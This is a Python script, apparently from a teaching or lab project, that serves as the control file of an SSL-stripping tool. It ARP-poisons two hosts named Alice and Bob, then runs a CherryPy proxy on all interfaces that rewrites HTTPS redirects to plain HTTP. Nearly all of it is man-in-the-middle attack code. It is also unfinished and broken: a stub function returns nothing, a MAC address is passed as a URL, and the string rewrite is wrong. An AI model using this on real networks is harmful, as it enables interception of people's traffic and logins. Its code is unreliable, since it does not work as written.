## Main contorl script of the Lite-SSLSTRIP too
## Reads user input and
## launches the ARP-poisoning and SSL strip

# TODO horrible intro ASCII art
import argparse
from arppoison import ArpPoison
import cherrypy
import random
import string
import requests
# Commandline arguments for ARP-spoofing
parser = argparse.ArgumentParser()
parser.add_argument('macA', help="MAC address of Alice")
parser.add_argument('ipA', help="IP address of Alice")
parser.add_argument('macB', help="MAC address of Bob")
parser.add_argument('ipB', help="IP address of Bob")

# IDEA get this from the machine itself
parser.add_argument('macM', help="MAC address of you (Mallory)")
parser.add_argument('ipM', help="IP address of you (Mallory)")

args = parser.parse_args()

# Launch ARP attack
arp = ArpPoison(args.macA, args.ipA, args.macB, args.ipB, args.macM, args.ipM)
arp.arpPoisonA()
arp.arpPoisonB()

# TODO actually write this function
def startSSLConnection():
    # TODO use requests package to start a SSL connection to Bob, return the resulting content
    return

class SSLStrip(object):
    @cherrypy.expose
    def index(self):
        # get content from server
        r = requests.get(args.macB)
        if (r.status_code == 302):
            location = r.headers['location']
            if (location[:5] == "https"):
                print "HTTPS redirect SSL stripping engaged"
                ## TODO: You might want to rewrite this to a function
                # first of all update the location that is going to be displayed
                updatedLocation = location[:5].join(location[6:]) # cut out the s in https
                r.headers['location'] = updatedLocation

                # secondly change the statuscode to a proper request
                r.status_code = 200

                ## TODO: start a session with Bob and get the right response!
                secureResponse = startSSLConnection()
                r.content = secureResponse.content
                return r
        else:
            return r

# starting the server
if __name__ == '__main__':
    # this command binds cherrypy to all interfaces of this machine, hence it is findable on the network
    cherrypy.config.update({'server.socket_host': '0.0.0.0'})
    # this command actually starts the server
    cherrypy.quickstart(SSLStrip())

